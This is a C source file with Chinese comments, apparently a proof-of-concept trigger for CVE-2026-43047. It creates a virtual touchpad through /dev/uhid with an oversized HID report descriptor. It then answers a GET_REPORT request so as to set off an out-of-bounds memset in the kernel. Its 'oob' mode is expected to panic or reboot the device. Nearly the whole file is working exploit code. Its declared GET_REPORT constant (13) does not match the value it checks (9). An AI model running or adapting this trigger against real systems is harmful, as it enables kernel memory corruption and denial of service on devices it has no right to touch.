/* uhid_wptp.c — CVE-2026-43047 触发探针 v3：真实 WPTP 描述符     §DC
 *
 * 关键改动：不再手写最小描述符，改用基于微软官方 Sample 的完整 Windows Precision
 * Touchpad 描述符（hid-multitouch 一定能绑定），只做两处修改：
 *   ① 在 Report ID 1（输入报告）里加若干 Const 输入字段，把 report->size 撑大
 *      ⇒ hid_report_raw_event 里的 rsize 变大 ⇒ memset 越界长度变大
 *   ② 保留 Report ID 2 的 Device Capabilities FEATURE 报告（含 ContactMax 0x55）
 *      ⇒ mt_feature_mapping(ContactMax) → mt_get_feature(hdev, 该报告) → GET_REPORT
 *
 * 用法：
 *   ./uhid_wptp discover [pad]   探测回复事件编号（数据填 0，安全）
 *   ./uhid_wptp safe     [pad]   用已发现的编号回复，data[0]=0（不越界）
 *   ./uhid_wptp oob      [pad]   data[0]=1 ⇒ 触发越界（预期 panic / 重启）
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/select.h>
#include <sys/time.h>

#define EVSZ 4380
#define BIG_REPORT_ID 1
#define CAPP_REPORT_ID 2

/* 事件类型：本机 GET_REPORT=13(实测)，回复编号需实测 */
#define T_GET_REPORT 13
static int g_reply_type = 14;    /* 候选，discover 模式会实测 */

static unsigned char ev[EVSZ];
static int g_mode = 0;           /* 0=discover 1=safe 2=oob */
static int g_get_report_seen = 0;

static void wr32(int o, uint32_t v) { memcpy(ev + o, &v, 4); }
static void wr16(int o, uint16_t v) { memcpy(ev + o, &v, 2); }
static uint32_t rd32(int o) { uint32_t v; memcpy(&v, ev + o, 4); return v; }

/* ---------- 真实 WPTP 描述符(来自微软官方 Sample, 经 CSDN 整理) ---------- */
static const unsigned char wptp[] = {
0x05, 0x0D, 0x09, 0x05, 0xA1, 0x01,
    0x85, 0x01,
    0x09, 0x56, 0x24, 0x00, 0x26, 0xFF, 0xFF, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
    0x09, 0x54, 0x25, 0x05, 0x75, 0x08, 0x81, 0x02,
    0x05, 0x20, 0x0A, 0x94, 0x04, 0x15, 0x00, 0x26, 0xFF, 0x0F, 0x35, 0x00,
    0x46, 0xFF, 0x0F, 0x65, 0x12, 0x75, 0x0C, 0x95, 0x01, 0x81, 0x02,
    0x05, 0x0D, 0x09, 0x22, 0xA1, 0x02,
        0x09, 0x51, 0x25, 0x0F, 0x75, 0x04, 0x95, 0x01, 0x81, 0x02,
        0x09, 0x42, 0x25, 0x01, 0x75, 0x01, 0x81, 0x02,
        0x09, 0x47, 0x81, 0x02,
        0x95, 0x05, 0x81, 0x03,
        0x05, 0x01, 0x09, 0x30, 0x15, 0x00, 0x26, 0xC8, 0x00, 0x35, 0x00,
        0x45, 0x69, 0x65, 0x11, 0x75, 0x10, 0x95, 0x01, 0x81, 0x02,
        0x09, 0x31, 0x26, 0x96, 0x00, 0x45, 0x4B, 0x81, 0x02,
        0x05, 0x0D, 0x09, 0x30, 0x15, 0x00, 0x26, 0xFF, 0x0F, 0x35, 0x00,
        0x46, 0xFF, 0x0F, 0x65, 0x12, 0x75, 0x0C, 0x95, 0x01, 0x81, 0x02,
    0xC0,
    0x05, 0x09, 0x09, 0x01, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01,
    0x81, 0x02, 0x95, 0x07, 0x81, 0x03,
    /* ★★★ 这里插入膨胀字段(仍属 Report ID 1)，由代码追加 ★★★ */
    0x85, 0x02,
    0x05, 0x0D, 0x09, 0x55, 0x25, 0x05, 0x75, 0x08, 0x95, 0x01, 0xB1, 0x02,
    0x09, 0x59, 0x25, 0x02, 0xB1, 0x02,
    0x85, 0x40,
    0x05, 0x0D, 0x09, 0xB0, 0x15, 0x01, 0x25, 0x03, 0x35, 0x6E, 0x45, 0xBE,
    0x65, 0x12, 0x75, 0x02, 0x95, 0x01, 0xB1, 0x02,
    0x85, 0x41,
    0x05, 0x0E, 0x09, 0x01, 0xA1, 0x02,
        0x09, 0x23, 0x15, 0x00, 0x25, 0x04, 0x75, 0x08, 0x95, 0x01, 0xB1, 0x02,
    0xC0,
0xC0,
};

static unsigned char desc[4096];
static int desc_len;

/* 组装描述符：WPTP + 膨胀字段插到 Report ID 2 之前 */
static void build_desc(int pad_units) {
    static const unsigned char marker[] = { 0x85, 0x02 };   /* Report ID 2 */
    int i, pos = 0, split = -1;

    /* 找到 0x85,0x02 的位置 */
    for (i = 0; i < (int)sizeof(wptp) - 1; i++) {
        if (wptp[i] == 0x85 && wptp[i+1] == 0x02) { split = i; break; }
    }
    if (split < 0) split = sizeof(wptp);

    memcpy(desc + pos, wptp, split);            pos += split;
    /* ★ 膨胀字段：pad_units 组 × (Report Size 8 / Count 255 / Const Input) ⇒ 每组 255 字节 */
    for (i = 0; i < pad_units; i++) {
        desc[pos++] = 0x75; desc[pos++] = 0x08;              /* Report Size (8) */
        desc[pos++] = 0x95; desc[pos++] = 0xFF;              /* Report Count (255) */
        desc[pos++] = 0x81; desc[pos++] = 0x03;              /* Input (Const,Var,Abs) */
    }
    memcpy(desc + pos, wptp + split, sizeof(wptp) - split);  pos += sizeof(wptp) - split;
    desc_len = pos;
}

/* ---------- sysfs 检查(纯 C) ---------- */
static void readfile1(const char *p, char *out, int outn) {
    int f = open(p, O_RDONLY); out[0] = 0;
    if (f < 0) { snprintf(out, outn, "(无)"); return; }
    int n = read(f, out, outn - 1); close(f);
    if (n < 0) n = 0;
    out[n] = 0;
    while (n > 0 && (out[n-1] == '\n' || out[n-1] == ' ')) out[--n] = 0;
}

static void show_binding(void) {
    DIR *d = opendir("/sys/bus/hid/devices");
    if (!d) { printf("  opendir 失败 errno=%d\n", errno); return; }
    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        if (de->d_name[0] == '.') continue;
        char path[512], link[512], nm[256];
        snprintf(path, sizeof(path), "/sys/bus/hid/devices/%s/driver", de->d_name);
        ssize_t n = readlink(path, link, sizeof(link) - 1);
        if (n < 0) n = 0; link[n] = 0;
        const char *drv = strrchr(link, '/'); drv = drv ? drv + 1 : link;
        printf("  hid %-30s driver=%s\n", de->d_name, n > 0 ? drv : "(未绑定)");
        snprintf(path, sizeof(path), "/sys/bus/hid/devices/%s/quirks", de->d_name);
        readfile1(path, nm, sizeof(nm));
        if (nm[0]) printf("       quirks = %s\n", nm);
    }
    closedir(d);
}

/* ---------- 回复 ---------- */
static int send_reply(int fd, int type, uint32_t id, uint8_t first) {
    memset(ev, 0, EVSZ);
    wr32(0, (uint32_t)type);
    wr32(4, id);
    wr16(8, 0);            /* .err */
    wr16(10, 1);           /* .size = 1 */
    ev[12] = first;        /* .data[0] */
    errno = 0;
    ssize_t w = write(fd, ev, EVSZ);
    printf("      回复 type=%-3d -> ret=%-4zd errno=%d%s\n", type, w, errno,
           w > 0 ? "  ★ 被接受" : "");
    return w > 0 ? 0 : -1;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    const char *m = (argc > 1) ? argv[1] : "discover";
    int pad = (argc > 2) ? atoi(argv[2]) : 4;      /* 膨胀组数，4 组 = 1020 字节 */
    if (pad < 0 || pad > 16) pad = 4;
    g_mode = strcmp(m, "oob") == 0 ? 2 : (strcmp(m, "safe") == 0 ? 1 : 0);
    if (argc > 3) g_reply_type = atoi(argv[3]);

    printf("=== uhid_wptp v3  模式=%s  pad=%d(⇒膨胀 %d 字节)  回复编号=%d ===\n",
           m, pad, pad * 255, g_reply_type);

    build_desc(pad);
    printf("描述符 %d 字节\n", desc_len);

    int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open /dev/uhid 失败 errno=%d\n", errno); return 1; }

    /* 传统 CREATE(type 0)，rd_data 用用户指针 */
    memset(ev, 0, EVSZ);
    wr32(0, 0);
    strncpy((char *)(ev + 4), "uhid_wptp", 127);
    strncpy((char *)(ev + 132), "virt-0", 63);
    uint64_t p = (uint64_t)(uintptr_t)desc;
    memcpy(ev + 260, &p, 8);
    wr16(268, (uint16_t)desc_len);
    wr16(270, 0x0003);
    wr32(272, 0x1234); wr32(276, 0x5678); wr32(280, 1);
    errno = 0;
    ssize_t w = write(fd, ev, EVSZ);
    printf("传统 CREATE -> ret=%zd errno=%d\n", w, errno);
    if (w < 0) { printf("创建失败\n"); return 1; }

    printf("\n事件循环(最多 15 秒)...\n");
    static const int cand[] = { 14, 11, 12, 15, 10, 13 };
    int disc_seq = 0;
    struct timeval t0; gettimeofday(&t0, NULL);

    for (;;) {
        struct timeval now; gettimeofday(&now, NULL);
        if (now.tv_sec - t0.tv_sec > 15) { printf("  [超时]\n"); break; }
        struct timeval tv = { 1, 0 };
        fd_set rf; FD_ZERO(&rf); FD_SET(fd, &rf);
        int s = select(fd + 1, &rf, NULL, NULL, &tv);
        if (s <= 0) continue;
        ssize_t r = read(fd, ev, EVSZ);
        if (r <= 0) { printf("  read=%zd errno=%d\n", r, errno); continue; }
        uint32_t type = rd32(0);
        printf("  <事件 type=%u> 载荷:", type); for(int _i=4;_i<36&&_i<(int)r;_i++) printf(" %02x", ev[_i]); printf("\n");

        /* GET_REPORT 载荷形如 {u32 id; u8 rnum; u8 rtype;} → 载荷起点 4 */
        uint32_t id = rd32(4);
        uint8_t rnum = ev[8], rtype = ev[9];
        int looks_get = (type == 9);
        if (!looks_get) continue;

        printf("      ⇒ GET_REPORT: id=%u rnum=%u rtype=%u  ★ mt_get_feature 已执行\n",
               id, rnum, rtype);
        g_get_report_seen = 1;

        if (g_mode == 0) {
            if (disc_seq < (int)(sizeof(cand)/sizeof(cand[0]))) {
                send_reply(fd, cand[disc_seq], id, 0);
                disc_seq++;
            }
        } else {
            uint8_t fb = (g_mode == 2) ? BIG_REPORT_ID : 0;
            printf("      data[0]=%u (%s)\n", fb, (g_mode == 2) ? "★触发越界" : "安全");
            send_reply(fd, g_reply_type, id, fb);
            if (g_mode == 2) { printf("  [已发送越界触发，等待内核反应]\n");
                               sleep(5); printf("  [5 秒后进程仍存活]\n"); break; }
        }
    }

    printf("\n绑定状态:\n");
    show_binding();
    printf("\n=== 结束, 进程存活 ===\n");
    close(fd);
    return 0;
}
